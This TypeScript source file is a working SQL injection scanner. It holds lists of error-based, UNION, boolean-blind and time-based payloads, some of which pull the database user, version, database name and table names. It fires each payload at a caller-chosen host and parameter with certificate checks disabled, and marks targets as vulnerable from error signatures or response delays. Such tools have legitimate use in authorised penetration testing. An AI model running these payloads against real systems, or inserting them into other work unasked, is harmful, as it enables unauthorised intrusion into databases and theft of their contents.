import * as http from "http";
import * as https from "https";
import { randomBytes } from "crypto";

export interface SQLiConfig {
  target: string;
  port: number;
  path: string;
  method: "GET" | "POST";
  paramName: string;
  technique: string;
  duration: number;
}

export interface SQLiResult {
  technique: string;
  payload: string;
  status: "vulnerable" | "potential" | "not_vulnerable" | "error";
  statusCode?: number;
  responseTime?: number;
  evidence?: string;
  dbType?: string;
  timestamp: number;
}

export interface SQLiJob {
  id: string;
  config: SQLiConfig;
  startTime: number;
  active: boolean;
  results: SQLiResult[];
  summary: { vulnerable: number; potential: number; tested: number };
  dbTypeDetected?: string;
}

const jobs = new Map<string, SQLiJob>();

function makeId() { return randomBytes(8).toString("hex"); }

const ERROR_SIGNATURES: Record<string, string[]> = {
  MySQL:      ["you have an error in your sql syntax", "warning: mysql", "mysql_fetch", "mysql_num_rows", "supplied argument is not a valid mysql", "column count doesn't match"],
  PostgreSQL: ["pg_query()", "pg::invalidtextrepresentation", "syntax error at or near", "unterminated quoted string", "division by zero", "pg_exec()"],
  MSSQL:      ["microsoft ole db provider", "odbc microsoft access", "unclosed quotation mark", "incorrect syntax near", "microsoft odbc sql server driver", "syntax error converting"],
  Oracle:     ["ora-00907", "ora-00933", "ora-00942", "oracle error", "quoted string not properly terminated"],
  SQLite:     ["sqlite3::query", "sqlite_step", "no such column", "unrecognized token"],
  Generic:    ["sql syntax", "sql error", "syntax error", "database error", "invalid query", "db error", "query failed", "error in your sql"],
};

const BOOLEAN_PAYLOADS = [
  { true: "' OR '1'='1", false: "' OR '1'='2" },
  { true: "' OR 1=1--", false: "' OR 1=2--" },
  { true: "' OR 'x'='x", false: "' OR 'x'='y" },
  { true: "1 OR 1=1", false: "1 OR 1=2" },
  { true: "1' OR '1'='1'--", false: "1' OR '1'='2'--" },
];

const ERROR_PAYLOADS = [
  "'", "''", "'\"", "\"", "\\", "';", "' --", "' #",
  "' OR '1", "1'", "1\"", "1`",
  "' AND 1=CONVERT(int, (SELECT TOP 1 name FROM sysobjects WHERE xtype='u'))--",
  "' AND extractvalue(1,concat(0x7e,(SELECT version())))--",
  "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
  "';SELECT SLEEP(0)--",
  "') OR ('1'='1",
  "1 UNION SELECT NULL--",
  "1 UNION SELECT NULL,NULL--",
  "1 UNION SELECT NULL,NULL,NULL--",
  "' UNION SELECT user(),2--",
  "' UNION SELECT version(),2--",
];

const TIME_PAYLOADS = [
  { payload: "'; IF (1=1) WAITFOR DELAY '0:0:5'--", dbHint: "MSSQL", delay: 5 },
  { payload: "' AND SLEEP(5)--", dbHint: "MySQL", delay: 5 },
  { payload: "'; SELECT pg_sleep(5)--", dbHint: "PostgreSQL", delay: 5 },
  { payload: "' OR SLEEP(5)--", dbHint: "MySQL", delay: 5 },
  { payload: "1;SELECT SLEEP(5)--", dbHint: "MySQL", delay: 5 },
];

const UNION_PAYLOADS = [
  "' UNION SELECT null--",
  "' UNION SELECT null,null--",
  "' UNION SELECT null,null,null--",
  "' UNION SELECT null,null,null,null--",
  "' UNION SELECT 1,user(),3--",
  "' UNION SELECT 1,database(),3--",
  "' UNION SELECT 1,version(),3--",
  "' UNION SELECT 1,table_name,3 FROM information_schema.tables--",
  "1 UNION ALL SELECT NULL--",
  "1 UNION ALL SELECT NULL,NULL--",
];

function detectDbType(body: string): string | undefined {
  const lower = body.toLowerCase();
  for (const [db, sigs] of Object.entries(ERROR_SIGNATURES)) {
    if (sigs.some((s) => lower.includes(s))) return db;
  }
}

function isVulnerable(body: string): boolean {
  const lower = body.toLowerCase();
  return Object.values(ERROR_SIGNATURES).flat().some((s) => lower.includes(s));
}

function sendRequest(
  config: SQLiConfig,
  payload: string,
  cb: (code: number, body: string, rt: number, err?: string) => void
) {
  const isHttps = config.port === 443;
  const mod: typeof http | typeof https = isHttps ? https : http;
  const start = Date.now();

  let reqOpts: http.RequestOptions;
  let body: string | null = null;

  if (config.method === "GET") {
    const sep = config.path.includes("?") ? "&" : "?";
    reqOpts = {
      hostname: config.target,
      port: config.port,
      path: `${config.path}${sep}${config.paramName}=${encodeURIComponent(payload)}`,
      method: "GET",
      headers: { "User-Agent": "Mozilla/5.0 (compatible; SecurityScanner/1.0)" },
      timeout: 10000,
      rejectUnauthorized: false,
    };
  } else {
    body = `${config.paramName}=${encodeURIComponent(payload)}`;
    reqOpts = {
      hostname: config.target,
      port: config.port,
      path: config.path,
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": String(body.length),
        "User-Agent": "Mozilla/5.0 (compatible; SecurityScanner/1.0)",
      },
      timeout: 10000,
      rejectUnauthorized: false,
    };
  }

  const req = mod.request(reqOpts, (res) => {
    let data = "";
    res.on("data", (chunk: Buffer) => { data += chunk.toString().slice(0, 2048); });
    res.on("end", () => cb(res.statusCode ?? 0, data, Date.now() - start));
  });
  req.on("timeout", () => { req.destroy(); cb(0, "", 10000, "timeout"); });
  req.on("error", (e) => cb(0, "", 0, e.message));
  if (body) req.write(body);
  req.end();
}

export function startSQLiScan(config: SQLiConfig): SQLiJob {
  const id = makeId();
  const job: SQLiJob = {
    id, config,
    startTime: Date.now(),
    active: true, results: [],
    summary: { vulnerable: 0, potential: 0, tested: 0 },
  };
  jobs.set(id, job);

  const addResult = (r: SQLiResult) => {
    job.results.push(r);
    job.summary.tested++;
    if (r.status === "vulnerable") job.summary.vulnerable++;
    if (r.status === "potential") job.summary.potential++;
    if (r.dbType && !job.dbTypeDetected) job.dbTypeDetected = r.dbType;
  };

  const runScans = async () => {
    const allPayloads: Array<{ payload: string; technique: string }> = [];

    if (config.technique === "all" || config.technique === "error-based") {
      ERROR_PAYLOADS.forEach((p) => allPayloads.push({ payload: p, technique: "error-based" }));
    }
    if (config.technique === "all" || config.technique === "union") {
      UNION_PAYLOADS.forEach((p) => allPayloads.push({ payload: p, technique: "union" }));
    }
    if (config.technique === "all" || config.technique === "boolean-blind") {
      BOOLEAN_PAYLOADS.forEach((bp) => {
        allPayloads.push({ payload: bp.true, technique: "boolean-blind" });
        allPayloads.push({ payload: bp.false, technique: "boolean-blind-false" });
      });
    }
    if (config.technique === "all" || config.technique === "time-based") {
      TIME_PAYLOADS.forEach((tp) => allPayloads.push({ payload: tp.payload, technique: "time-based" }));
    }

    const delay = (ms: number) => new Promise((r) => setTimeout(r, ms));

    for (const { payload, technique } of allPayloads) {
      if (!job.active) break;

      await new Promise<void>((resolve) => {
        sendRequest(config, payload, (code, body, rt, err) => {
          if (err) {
            addResult({ technique, payload, status: "error", responseTime: rt, evidence: err, timestamp: Date.now() });
            return resolve();
          }

          const vuln = isVulnerable(body);
          const dbType = detectDbType(body);

          if (technique === "time-based") {
            const tp = TIME_PAYLOADS.find((t) => t.payload === payload);
            const status = tp && rt >= (tp.delay - 0.5) * 1000 ? "vulnerable" : "not_vulnerable";
            addResult({ technique, payload, status, statusCode: code, responseTime: rt, evidence: status === "vulnerable" ? `Response delayed ${rt}ms — time-based blind SQLi confirmed (${tp?.dbHint})` : undefined, dbType: tp?.dbHint, timestamp: Date.now() });
          } else {
            const status = vuln ? "vulnerable" : code === 500 ? "potential" : "not_vulnerable";
            addResult({ technique, payload, status, statusCode: code, responseTime: rt, evidence: vuln ? body.slice(0, 400) : undefined, dbType, timestamp: Date.now() });
          }
          resolve();
        });
      });

      await delay(100);
    }

    job.active = false;
    jobs.delete(id);
  };

  runScans();
  return job;
}

export function getSQLiJob(id: string): SQLiJob | undefined {
  return jobs.get(id);
}

export function stopSQLiScan(id: string): boolean {
  const job = jobs.get(id);
  if (!job) return false;
  job.active = false;
  jobs.delete(id);
  return true;
}
